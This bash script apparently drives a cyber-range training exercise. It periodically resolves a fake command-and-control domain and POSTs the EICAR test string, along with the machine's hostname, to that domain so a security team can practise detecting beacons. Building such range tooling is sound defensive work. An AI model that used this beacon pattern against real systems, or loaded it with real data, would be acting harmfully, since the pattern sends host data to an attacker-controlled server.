#!/usr/bin/env bash
# SYNTHETIC, BENIGN training beacon for a Linux EP-INFECTED. NOT malware.
# Emits a DNS lookup + HTTP POST (EICAR test string) toward a FAKE domain so
# the SOC has something to detect. Nothing malicious runs/persists. Ctrl+C stops.
# Usage: ./benign-beacon.sh [domain] [interval_sec] [max_beacons]
DOMAIN="${1:-updates.evil-c2.range}"
INTERVAL="${2:-30}"
MAX="${3:-0}"
EICAR='X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'

echo "[range] BENIGN beacon -> $DOMAIN every ${INTERVAL}s (Ctrl+C to stop)"
count=0
while :; do
  count=$((count+1)); ts=$(date -Is)
  ip=$(dig +short "$DOMAIN" 2>/dev/null | head -1)
  if [ -n "$ip" ]; then
    echo "[$ts] DNS $DOMAIN -> $ip"
    if curl -s -m5 -o /dev/null -X POST --data "$EICAR" "http://$DOMAIN/checkin?id=$(hostname)"; then
      echo "[$ts]   callback POST succeeded (Path B: reached attacker)"
    else
      echo "[$ts]   callback FAILED/blocked (Path A: contained)"
    fi
  else
    echo "[$ts] DNS resolution failed for $DOMAIN"
  fi
  [ "$MAX" -gt 0 ] && [ "$count" -ge "$MAX" ] && break
  sleep "$INTERVAL"
done
